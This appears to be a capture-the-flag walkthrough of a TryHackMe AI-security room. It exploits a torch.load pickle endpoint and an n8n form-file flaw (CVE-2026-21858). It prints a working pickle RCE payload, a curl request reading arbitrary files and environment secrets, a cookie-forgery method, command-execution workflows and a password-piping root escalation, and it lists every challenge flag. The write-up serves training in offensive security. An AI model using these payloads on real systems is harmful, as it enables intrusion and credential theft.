# TryHackMe: Cypheron — Walkthrough

*Event: 2026: An AI Odyssey (insane-difficulty collection). Attack box: WSL Kali. Three tasks, five flags.*

---

## Task 1 & 2 — Trojaned Model: Neural C2 Beacon

**Target:** `10.144.186.120` · AI Supply Chain Security · artifact `signal_classifier.pt` provided.

### Enumeration

I started with a full port scan and found a single service:

```
8000/tcp open http Gunicorn
```

The root endpoint advertised its own API as JSON:

```
POST /classify     -> features: list[float] length 16, returns class + probabilities
POST /vendor/push  -> multipart 'artifact' = .pt file, "loaded via torch.load for
                      backwards compatibility" -> returns validated vendor metadata
```

That one note did most of my threat-modelling for me. `torch.load` deserialises pickle, and "backwards compatibility … before weights-only serialisation existed" is a polite way of saying `weights_only=False`. So `/vendor/push` was an unsafe-deserialisation RCE waiting to happen, and `/classify` was where the briefing's "trigger-based backdoor" presumably lived.

### Flag 1 — analysing the artifact

The model file wasn't served over HTTP (`/signal_classifier.pt` → 404), so I used the copy attached to the room. A `.pt` is just a ZIP, so I read it directly. The state-dict carried an unusual tensor, `_calibration_constants`, stored as a `ByteStorage` — and its raw bytes in `data/0` were plaintext:

```
THM{artifact_suspicious}
```

**Flag 1: `THM{artifact_suspicious}`** — the embedded "vendor build identifier" that gives the trojaned artifact away.

### Flag 3 — the deserialisation RCE

I went after the `/vendor/push` pickle RCE next because it was the clearest path. I built a malicious `.pt` with a stdlib-only pickle (no torch needed), using `__reduce__` to run code on load.

First attempt — a plain pickle — was rejected: `Invalid magic number; corrupt file?`. torch validates its own container, so I wrapped the malicious pickle inside a torch-style ZIP (`archive/data.pkl` + `version` + `byteorder`). That got past the magic check, then the server complained in turn about a missing `state_dict`, then about `load_state_dict` failing.

That was the key realisation: **the pickle's `__reduce__` executes during unpickling, before any of those validation steps** — so the code was already running; I just couldn't see the output because the server then crashed. The server echoes exceptions back in its `"validation failed: <exc>"` error, so I made my payload *raise* an exception whose message was the command output:

```python
class P:
    def __reduce__(self):
        return (exec, ("raise Exception(__import__('subprocess')"
                       ".check_output('cat /flag*; id',shell=True).decode())",))
```

That returned, inline in the HTTP error:

```
THM{neural_c2_compromise}
=== uid=1000(epoch) gid=999(epoch) ===
```

**Flag 3: `THM{neural_c2_compromise}`** — from `/flag`, read via blind pickle RCE (output exfiltrated through the error channel, no listener needed).

### Flag 2 — the long way around (dead ends)

I assumed "trigger-based backdoor" meant a behavioural trojan and burned real time on it. Using the RCE as a code-exec oracle, I loaded the model server-side and tried, in order:

- decoding every tensor's bytes / byte-planes / LSB-bit stream as ASCII — nothing but flag 1;
- dumping all blob metadata and hidden-layer activations for canonical inputs — clean;
- spiking each of the 16 features to map the decision surface — it behaved like a normal anomaly detector (in-distribution = valid, anything OOD = anomalous);
- gradient-searching for an OOD-but-"valid" trigger basin — none existed.

The model was genuinely just a clean MLP plus the flag-1 buffer. I also chased hidden endpoints and an internal C2 host — all empty.

The course-correction: stop theorising and **grep the whole filesystem** via the RCE. That found a file I'd never have guessed:

```
/etc/c2-hint.txt  ->  THM{trigger_identified}
```

The file framed itself as the implant's "proof of execution" dropped on disk once the trojaned artifact runs — not a behavioural backdoor to reverse at all.

**Flag 2: `THM{trigger_identified}`**.

**Lesson:** when a CTF flag isn't where the category name implies, enumerate the filesystem before reverse-engineering. I over-fit to "trigger-based backdoor" and skipped the cheap broad grep for too long.

---

## Task 3 — AI Sec + Red Team Nightmare (n8n)

**Target:** `10.145.164.203`. Two flags (user + root). Briefing: *"a public intake at `/form/file-processor` … too trusting about what its visitors claim to carry … End at the workflow that should not exist, and let it speak."*

### Finding the service

A full SYN scan showed only SSH (22). Curling common web ports from Kali all returned `000`. A reliable full connect-scan (`-sT -p-`) turned up what the SYN scan had dropped:

```
22/tcp   open ssh
5678/tcp open  (n8n)
```

Port 5678 + "orchestrator"/"workflow" = **n8n**. `/form/file-processor` served an n8n Form Trigger ("Document Upload Service") with one file field, `field-0`.

### The echo, and the dead ends

Submitting a file just returned its content verbatim (`useResponseData=true`, "let it speak"). I spent a while trying to make that echo do something: varying the claimed MIME type, filename, and extension (all echoed); n8n expression injection `{{7*7}}` (literal); XXE with a real XML entity (not parsed); shell-injection in filename/mimetype/content with an OOB HTTP listener (no callbacks); a hand-built PDF and valid CSV/JSON to trigger an "Extract from File → AI" branch (raw echo, including 687 bytes of PDF returned byte-for-byte — so definitively no LLM on the path). `/rest/*` was auth-gated and owner setup was already complete, so no takeover there.

The version string gave it away: **n8n 1.120.4**, and the room is literally named *Nightmare* → **CVE-2026-21858 "Ni8mare"**, unauthenticated RCE. The precondition described in the advisory — a Form Trigger with a file field feeding a Respond-with-binary node — was exactly this workflow.

### Flag 1 (user) — content-type confusion → arbitrary file read

The flaw: `parseRequestBody()` picks a parser by Content-Type, and a non-multipart request routes to `parseBody()`, which drops the body straight into `req.body` with no file-upload safeguards. The form handler then trusts `req.body.files` and copies the referenced file off disk — and the Respond-with-binary node hands it back. That's why *multipart* only ever echoed; the exploit is **JSON instead of multipart**, directly supplying a file descriptor with an arbitrary `filepath`.

After a couple of structure mismatches (`Workflow could not be started`), the working shape was:

```bash
curl -H 'Content-Type: application/json' --data \
 '{"files":{"field-0":[{"filepath":"/etc/hostname","originalFilename":"x","mimetype":"text/plain","size":10}]}}' \
 http://10.145.164.203:5678/form/file-processor
```

That returned the container hostname → arbitrary file read as the `node` user. I then read `/proc/self/environ`:

```
N8N_USER_MANAGEMENT_JWT_SECRET=cve-2026-21858-lab-jwt-secret
N8N_ENCRYPTION_KEY=cve-2026-21858-lab-enc-key
HOME=/home/node   DB_TYPE=sqlite
```

### Admin takeover — forging the session cookie

I pulled the sqlite DB (`/home/node/.n8n/database.sqlite`) through the same read primitive and `strings`-ed out the owner row:

```
id   f52da01b-db1b-4ad5-97d0-2f2ee6332825
email admin@lab.local
pass  $2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq
role  global:owner
```

n8n signs the `n8n-auth` cookie as `{id, hash}` where `hash = base64(sha256(email + ':' + password))[:10]`, HS256 with the JWT secret. I forged it offline and confirmed with `GET /rest/login` — authenticated as the owner.

### RCE — "the workflow that should not exist"

As admin I created and activated a workflow: **Webhook → Execute Command → Respond** ("let it speak"). A couple of snags worth noting: create needs an explicit `"active":false` field; updates are `PATCH` not `PUT`; and the Execute Command node aborts the workflow on a non-zero exit (so a failing command returns an empty body — I append `echo END` to force exit 0).

Triggering it ran commands as `uid=1000(node)`, and `cat /home/node/*.txt` gave:

**User flag: `THM{nightmare_just_begun}`** (from `/home/node/flag-user-lfi.txt`).

I also found the pre-existing workflow the briefing hinted at — `Internal Automation — DO NOT SHARE` (webhook `secret-webhook` → Execute Command) — but it also ran as `node`, so it wasn't a privilege boundary on its own.

### Flag 2 (root) — enumeration → leaked password → su

The `node` user was locked down hard: no caps (`CapEff=0`), no sudo, only stock SUIDs, `/etc/passwd` and `/root` unreadable. The win was in `/proc/mounts`:

```
/dev/root /host-root  ext4 ro   <- host filesystem mounted read-only
/dev/root /setup.sh   ext4 ro
```

`/setup.sh` was world-readable and leaked the root password outright:

```
echo 'root:N1ghtm4r3R00t!CTF2026' | chpasswd
```

`su` needs a TTY, and `Execute Command` has none, so the first `echo pass | su` gave *authentication token manipulation error* (the password raced the prompt). Spawning a PTY with `script` and feeding the password **after a short `sleep`** fixed the timing:

```bash
(sleep 1; printf '%s\n' 'N1ghtm4r3R00t!CTF2026') \
  | script -qc "su root -c 'sh /tmp/r.sh'" /dev/null
```

That gave `uid=0(root)`. The flag wasn't at `/root/root.txt`; a root-level find located it at `/host-root/flag.txt`:

**Root flag: `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`**

The flag name advertises the *intended* privesc — a page-cache/kernel write for a container escape. The password leaked in `setup.sh` was the shortcut I actually took.

---

## Flags

| Task | Flag |
|------|------|
| 1 — artifact analysis | `THM{artifact_suspicious}` |
| 1/2 — trigger backdoor | `THM{trigger_identified}` |
| 1/2 — deserialisation RCE | `THM{neural_c2_compromise}` |
| 3 — user | `THM{nightmare_just_begun}` |
| 3 — root | `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}` |

## Takeaways

- **Pickle `.pt` = RCE.** `torch.load(weights_only=False)` on any attacker file is code execution; verbose error messages double as an output channel for blind exec.
- **Enumerate before you reverse.** The "trigger-based backdoor" flag was a dropped file, not a weights trojan — a filesystem grep would have saved a lot of model analysis.
- **Ni8mare (CVE-2026-21858):** content-type confusion on an n8n form file field → arbitrary file read → leak `N8N_USER_MANAGEMENT_JWT_SECRET` + DB → forge the `n8n-auth` cookie → admin → Execute Command RCE.
- **Check `/proc/mounts`.** A read-only host-FS mount plus a world-readable `setup.sh` turned a locked-down container user into root without needing the intended kernel exploit.
